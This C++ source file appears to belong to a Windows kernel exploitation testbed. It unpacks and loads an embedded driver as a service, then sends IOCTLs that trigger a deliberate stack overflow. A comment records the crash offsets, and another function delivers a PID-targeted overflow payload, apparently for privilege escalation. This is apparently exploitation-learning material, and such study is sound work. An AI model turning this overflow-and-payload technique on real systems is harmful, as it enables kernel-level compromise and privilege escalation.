#include "testbed.h"

namespace resource_functions
{
	typedef struct _RESOURCE
	{
		DWORD   data_sz;
		LPVOID  data;
	}RESOURCE, *PRESOURCE;

	bool extract(RESOURCE & resourse, LPCTSTR lpName, LPCTSTR lpType) {
		HRSRC   res_handle = NULL;
		if ((NULL != (res_handle = FindResource(NULL, lpName, lpType))) &&
			(0 != (resourse.data_sz = SizeofResource(NULL, res_handle)))) {
			HGLOBAL data_handle = NULL;
			if (NULL != (data_handle = LoadResource(NULL, res_handle))) {
			resourse.data = LockResource(data_handle);
			}
		}
		return (NULL != resourse.data);
	}

	bool get_tmp_file(LPCTSTR lpPrefixString, LPTSTR lpTempFileName) {
		auto b_res = false;
		const DWORD uUnique = 0;
		wchar_t tmp_path[MAX_PATH] = { 0 };
		if (GetTempPath(MAX_PATH, tmp_path) &&
			GetTempFileName(tmp_path, lpPrefixString, uUnique, lpTempFileName)){
			DeleteFile(lpTempFileName); // If uUnique is zero, GetTempFileName creates an empty file and closes it.
			b_res = ( 0 == wcscat_s(lpTempFileName, MAX_PATH, TEXT(".sys"))); 
			// lpTempFileName = <path>\<pre><uuuu>.TMP.sys
		}
		return b_res;
	}
} // namespace resource_functions

namespace testbed {

	bool TestBed::extract_driver_file(TCHAR * binFile) {
		auto b_res = false;
		resource_functions::RESOURCE my_res = { 0 };
		RtlSecureZeroMemory(&my_res, sizeof(resource_functions::RESOURCE));
		if (resource_functions::extract(my_res, MAKEINTRESOURCE(TESTBED_BIN_SYSFILE), TEXT("bin")) &&
			resource_functions::get_tmp_file(TEXT("TB"), binFile)) {
			HANDLE h_file = NULL;
			if ((HANDLE)INVALID_HANDLE_VALUE != (h_file = CreateFile(
				binFile, GENERIC_WRITE, FILE_SHARE_READ, NULL,
				CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL))) {
				DWORD number_of_bytes = 0;
				if (WriteFile(h_file, my_res.data, my_res.data_sz, &number_of_bytes, NULL) &&
					(number_of_bytes == my_res.data_sz)) {
					b_res = true;
				}
				CloseHandle(h_file);
			}
			else {
				print::print_last_err(L"err file %s ", binFile);
			}
		}
		return b_res;
	}

	bool TestBed::load_driver_from_file(TCHAR * binFile) {
		auto b_res = false;
		service_manager.set_names(TESTBED_SERVNAME_APP, binFile);
		service_manager.stop_driver();
		service_manager.remove_driver();
		if (service_manager.add_driver()) {
			if (service_manager.start_driver()) {
				if (INVALID_HANDLE_VALUE != service_manager.open_device(TESTBED_LINKNAME_APP)) {
					b_res = true;
					print::print_mes(L"The [%s] driver is active!", TESTBED_SERVNAME_APP);
					//	*for debugging process:
					// 	service_manager.close_device(m_hNeither);
					// 	service_manager.stop_driver();
					// 	service_manager.remove_driver();
				}
				else {
					print::print_last_err(L"err open device %s ", TESTBED_LINKNAME_APP);
				}
			}
			else {
				print::print_last_err(L"err start driver %s %s", TESTBED_SERVNAME_APP, binFile);
				service_manager.stop_driver();
				service_manager.remove_driver();
			}
		}
		else {
			print::print_last_err(L"err add driver %s %s", TESTBED_SERVNAME_APP, binFile);
			service_manager.stop_driver();
			service_manager.remove_driver();
		}
		service_manager.delete_binfile();
		return b_res;
	}

	bool TestBed::activate_testbed() {
		TCHAR bin_file[MAX_PATH] = { 0 };
		disable_compatibility_window :: disable();
		auto const b_res = extract_driver_file(bin_file) && load_driver_from_file(bin_file);
		disable_compatibility_window :: restore();
		return b_res;
	}

	//////////////////////////////////////////////////////////////////////////

	bool TestBed::run_basic_mem_access() {

		// Prepare buffers

		return service_manager.send_ctrl_code(TESTBED_BASIC_MEMORY_ACCESS, NULL, 0, NULL, 0, 0);
	}

	bool TestBed::run_simple_stack_overflow(DWORD bufferSz) {
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer) {
			memset(input_buffer, /*0x49*/ (int)'I', bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8
			*/

			b_res = service_manager.send_ctrl_code(TESTBED_SIMPLE_STACK_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

	bool TestBed::run_stack_overflow_with_payload(const DWORD targetPid) {
		auto b_res = false;
		{ // PayloadStackOverFlow constructor
			payload_stack_overflow::PayloadStackOverFlow my_payload(targetPid);
			if (my_payload.init()) {
				b_res = service_manager.send_ctrl_code(TESTBED_SIMPLE_STACK_OVERFLOW,
					my_payload._buffer, my_payload._bufferSz, NULL, 0, 0);

			}
		} // PayloadStackOverFlow destructor
		return b_res;
	}
} // namespace testbed 

// 	void get_process_token(const char* title, const DWORD targetPid) {
// 		HANDLE h_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
// 		HANDLE h_proc_handle = NULL;
// 		if (h_proc && OpenProcessToken(h_proc, TOKEN_QUERY, &h_proc_handle)) {
// 			if (h_proc_handle) {
// 				DWORD needed_sz = 0;
// 				GetTokenInformation(h_proc_handle, TokenOwner, NULL, 0, &needed_sz);
// 				if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
// 					PTOKEN_OWNER token_info = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed_sz);
// 					if (token_info) {
// 						RtlZeroMemory(token_info, needed_sz);
// 						if (GetTokenInformation(h_proc_handle, TokenOwner, token_info, needed_sz, &needed_sz)) {
// 							WCHAR user_name[MAX_PATH] = { 0 }, domain_name[MAX_PATH] = { 0 };
// 							DWORD user_name_sz = MAX_PATH, domain_name_sz = MAX_PATH;
// 							SID_NAME_USE s;
// 							if (LookupAccountSid(NULL, token_info->Owner, user_name, &user_name_sz, domain_name, &domain_name_sz, &s)) {
// 								cout << title << endl;
// 								cout << "pid = " << std::dec << targetPid << " owner: ";
// 								wcout << domain_name << '/' << user_name << endl;
// 							}
// 						}
// 						HeapFree(GetProcessHeap(), 0, token_info);
// 					}
// 				}
// 				CloseHandle(h_proc_handle);
// 			}
// 		}
// 		CloseHandle(h_proc);
// 	}

// 	bool set_current_dir(wchar_t * logFolder)
// 	{
// 		auto b_res = false;
// 		DWORD len = GetModuleFileName(NULL, logFolder, MAX_PATH);
// 		if (len)
// 		{
// 			while (len && logFolder[len] != TEXT('\\'))
// 			{
// 				len--;
// 			}
// 
// 			if (len)
// 			{
// 				logFolder[len + 1] = 0;
// 				if (!wcsncat_s(logFolder, MAX_PATH, TEXT("logs\\"), _TRUNCATE))
// 				{
// 					b_res = true;
// 				}
// 			}
// 		}
// 		return b_res;
// 	}

// 	bool create_log_folder(wchar_t * logFolder)
// 	{
// 		auto b_res = false;
// 		auto len = GetModuleFileName(NULL, logFolder, MAX_PATH);
// 		if (len)
// 		{
// 			while (len && logFolder[len] != TEXT('\\'))
// 			{
// 				len--;
// 			}
// 
// 			if (len)
// 			{
// 				logFolder[len + 1] = 0;
// 				if ((!wcsncat_s(logFolder, MAX_PATH, TEXT("logs\\"), _TRUNCATE)) &&
// 					(CreateDirectory(logFolder, NULL) || ERROR_ALREADY_EXISTS == GetLastError()))
// 				{
// 					UNICODE_STRING object_name;
// 					if (RtlDosPathNameToNtPathName_U(logFolder, &object_name, NULL, NULL))
// 					{
// 						if (_stprintf_s(logFolder, MAX_PATH, object_name.Buffer) >= 0)
// 						{
// 							b_res = true;
// 						}
// 					}
// 				}
// 			}
// 		}
// 		return b_res;
// 	}